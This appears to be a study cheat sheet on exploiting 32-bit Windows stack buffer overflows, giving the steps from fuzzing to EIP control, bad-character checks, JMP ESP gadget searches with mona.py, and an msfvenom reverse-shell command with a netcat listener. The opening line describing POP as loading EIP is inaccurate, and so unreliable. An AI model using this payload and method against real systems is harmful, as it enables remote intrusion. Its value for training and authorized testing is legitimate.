# Stack Buffer Overflow

## Basic Assembly

* POP -> Pops the top of the stack into the EIP register.

## The General Process

1. Find all inputs to the application.
2. Fuzz each input with garbage data in a loop that incrementally sends more bytes to get the application to crash.
3. Find the offset where the application crashes. Do this by creating a pattern with either pwntools or metasploit's `pattern_create`.
4. Copy the value from EIP which indicates where the application crashed and calculate the offset with either pwntools or metasploit's `pattern_offset`.
5. Take control over EIP by using 4 bytes at the offset returned by `pattern_offset`.
6. See if you can get more space for your shellcode by adding more bytes to your buffer and reproducing the same crash. The more space you have for your shellcode, the better off you will be.
7. Check for bad characters from `0x00` - `0xff`. You can right-click on ESP and select *Follow in Dump* to show the input buffer of hex characters in memory. Check how buffer of bad characters got modified.
8. Encode your shellcode so that it doesn't contain any bad characters.
9. Search for a JMP ESP gadget. This gadget must comply with the following criteria:
  * It does not come from a library compiled with ASLR support.
  * The address does not contain any bad characters.
  * ADVANCED TIP: If the module was compiled with DEP support, the JMP ESP needs to be located in the .text code segment of the module with both Read (R) and Executable (E) permissions.
10. You will need the opcode for the gadget. You should be able to achieve so with pwntools or metasploit's `nasm_shell`.
11. Use the address of the new found gadget to redirect execution back into your shellcode. Generally speaking, this works by JMP'ing ESP to your shellcode since you previously overflowed ESP with your shellcode.
  * Make sure that the EIP address is in little endian so that the CPU can interpret the opcode correctly!
12. Generate the shellcode with msfvenom.
  * Certain shellcode encodings like shikata_ga_nai require some NOP padding to function because they require some additional space to extract itself, so don't forget to add the NOP sled!
  * The default exit behavior of msfvenom shellcode is ExitProcess. If you want the process to stay alive after you lose your shell, you want to set the exit function to ExitThread.
13. Setup a netcat listener and pwn!

## Starting windows services

```bat
services.msc
```

## Bad Characters

```python
badchars = (b"\x00"
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

## Using mona.py to detect bad characters

Generate a bytearray

```none
!mona bytearray
!mona compare -f bytearray.txt -a <address where badcharacter buffer starts>
```

## Create a cyclic pattern

```bash
pwn cyclic 800
```

## Searching for JMP ESP gadgets on Windows

### Show modules

```none
!mona modules
```

### Find opcodes

Find `JMP ESP`

```none
!mona find -s "\xff\xe4" -m "MODULE NAME"
```

## Get assembly code

```none
pwn asm 'jmp esp; jmp eax'
```

## Generating shellcode

**Windows 32 bit reverse tcp shell without bad characters**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=443 EXITFUNC=thread -f python -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

## Extra

* Debug stepping through polymorphic shellcode seems to interfere with its unraveling. If you hit the `INT` instruction, you are best off hitting `continue` on the debugger to make sure `shikata_ga_nai` decodes itself smoothly decodes itself smoothly.
* Using the binary search theory can help with finding bad characters.

